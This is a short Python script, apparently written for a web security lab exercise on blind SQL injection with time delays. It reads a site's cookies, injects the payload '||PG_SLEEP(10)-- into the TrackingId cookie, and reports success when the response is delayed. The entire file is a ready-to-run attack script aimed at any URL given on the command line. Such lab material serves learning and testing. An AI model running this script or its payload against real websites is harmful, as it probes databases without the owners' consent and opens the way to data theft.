import requests
import sys
import urllib.parse
import getopt


def injection(url, trackingId, session):
  # If you get errors or false positives try incrementing the number 
  # in the payload at "PG_SLEEP(10)"
  payload = "'||PG_SLEEP(10)--"
  payload = urllib.parse.quote_plus(payload)
  cookies = {
    "TrackingId":trackingId + payload,
    "session":session
    }
  r = requests.get(url, cookies = cookies)
  if int(r.elapsed.total_seconds()) >= 10:
    return f"[*] Blind SQL Injection succesfull"
  else:
    sys.exit("[!] An error ocurred with the injection")


def get_cookie(url):
  session = requests.Session()
  if session.get(url).status_code != 200 :
    sys.exit("[!] Error. Status code is not '200'")

  cookies = session.cookies.get_dict()
  values = list(cookies.values())
  trackingId = values[0]
  session = values[1]
  
  return trackingId, session 


def main(argv):
  try:
    opts, args = getopt.getopt(argv, "hu:")
  except getopt.GetoptError:
    print("This is the script for:\n'Blind SQL injection with time delays'\n\nUsage: bsqli-3.py -u <url>")
    print("\x1b[?25h")
    sys.exit(2)

  for opt, arg in opts:
    if opt == "-u":
      url = arg
      trackingId, session = get_cookie(url)
    elif opt == "-h":
      print("This is the script for:\n'Blind SQL injection with time delays'\n\nUsage: bsqli-3.py -u <url>")
      print("\x1b[?25h")
      sys.exit()
  message = injection(url, trackingId, session)
  print(message)


if __name__ == "__main__":
  # Hide Cursor
  print("\x1b[?25l")
  main(sys.argv[1:])
  # Make cursor visible
  print("\x1b[?25h")
  sys.exit()